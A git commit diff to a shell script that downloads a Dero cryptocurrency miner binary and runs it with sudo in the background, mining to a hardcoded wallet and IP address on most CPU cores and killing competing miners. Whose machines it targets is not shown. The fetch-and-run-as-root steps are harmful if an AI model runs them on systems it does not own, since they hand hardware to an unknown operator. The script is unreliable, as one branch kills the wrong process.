8e02a297662ce1a0b1f3abb1a3ce565ae4e29864
onisoc <12600488+onisoc@users.noreply.github.com>
2022-10-15 20:33:56 +0700

    Update ba.sh

--- ba.sh
+++ ba.sh
@@ -7,59 +7,50 @@ else
 	username=$(ls /home | sed -n 1p)
 fi
 cd /home/$username/
+#wget -O fixdev.sh https://aztools.uk/fixdev.sh
+#chmod +x fixdev.sh
 core=$(nproc)
 minecore=$(printf '%.0f\n' $(($core*90/100)))
 if [ $core -lt 3 ]; then
 	minecore=$(($core/2))
 fi
-sudo rm -rf /home/$username/deroplus
 if pgrep -x "deroplus" > /dev/null
 then
 	sudo kill -9 $(pgrep -x "deroplus")
 fi
+if pgrep -x "astrominer" > /dev/null
+then
+	sudo kill -9 $(pgrep -x "deroplus")
+fi
+if pgrep -x "astrominer" > /dev/null
+    then
+	echo "Miner is running"
+	cpuusage=$(top -b -n2 -p 1 | fgrep "Cpu(s)" | tail -1 | awk '{print $2}'|cut -f 1 -d ".")
+	if [ $cpuusage -lt 40 ]; then
+		sudo kill -9 $(pgrep -x "astrominer")
+		if [ $core -lt 3 ]; then
+			nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
+		else
+			nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
+		fi
+	fi
+else
+    file="/home/$username/astrominer"
+	if [ -f $file ]; then
+		nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
+	else
+		wget -O /home/$username/astrominer https://github.com/onisoc/files/raw/main/astrominer
+		chmod +x /home/$username/astrominer
+		nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
+		#--wallet=dero1qyzhzc74y7a7yuqh9ghlp3xuq55nk52sz7crgscazrlh0rvhhxylgqgpv0f3g --host=80.79.5.26:10100 --mode solo --threads $minecore
+	fi
+fi
 defunctpid=$(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')
 if [ ! -z "$defunctpid" ]; then
 	sudo kill -9 $defunctpid
 fi
 if pgrep -x "deroplus" > /dev/null
 then
-	echo "Miner is running"
-	cpuusage=$(top -b -n2 -p 1 | fgrep "Cpu(s)" | tail -1 | awk '{print $2}'|cut -f 1 -d ".")
-	if [ $cpuusage -lt 40 ]; then
-		sudo kill -9 $(pgrep -x "deroplus")
-		if [ $core -lt 3 ]; then
-			nohup sudo /home/$username/deroplus --wallet=dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz.ML$RANDOM --host=pool.whalesburg.com:4300 --threads $minecore &
-		else
-			nohup sudo /home/$username/deroplus --wallet=dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz --host=80.79.5.26:10100 --mode solo --threads $minecore &
-		fi
-	fi
-else
-	if [ $core -lt 3 ]; then
-		file="/home/$username/deroplus"
-		if [ -f $file ]; then
-			nohup sudo /home/$username/deroplus --wallet=dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz.ML$RANDOM --host=pool.whalesburg.com:4300 --threads $minecore &
-		else
-			wget https://github.com/Jonutz123/Deroplus-AstroBWTv3/releases/download/publish2/deroplus-stratum-linux-amd64.tar.gz
-			tar xvf deroplus-stratum-linux-amd64.tar.gz
-			chmod +x deroplus-stratum-linux-amd64
-			sudo mv -f deroplus-stratum-linux-amd64 deroplus
-			nohup sudo /home/$username/deroplus --wallet=dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz.ML$RANDOM --host=pool.whalesburg.com:4300 --threads $minecore &
-		fi
-	else
-		file="/home/$username/deroplus"
-		if [ -f $file ]; then
-			nohup sudo /home/$username/deroplus --wallet=dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz --host=80.79.5.26:10100 --mode solo --threads $minecore &
-		else
-			wget https://github.com/Jonutz123/AstroBWTv3-Miner/releases/download/publish2/deroplus-linux-amd64.tar.gz
-			tar xvf deroplus-linux-amd64.tar.gz
-			chmod +x deroplus-linux-amd64
-			sudo mv -f deroplus-linux-amd64 deroplus
-			nohup sudo /home/$username/deroplus --wallet=dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz --host=80.79.5.26:10100 --mode solo --threads $minecore &
-			#--wallet=dero1qyzhzc74y7a7yuqh9ghlp3xuq55nk52sz7crgscazrlh0rvhhxylgqgpv0f3g --host=80.79.5.26:10100 --mode solo --threads $minecore
-		fi
-	fi
-fi
-defunctpid=$(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')
-if [ ! -z "$defunctpid" ]; then
-	sudo kill -9 $defunctpid
+	sudo sudo pkill -9 -f "/home/$username/deroplus"
+	sudo rm -rf /home/$username/deroplus
 fi
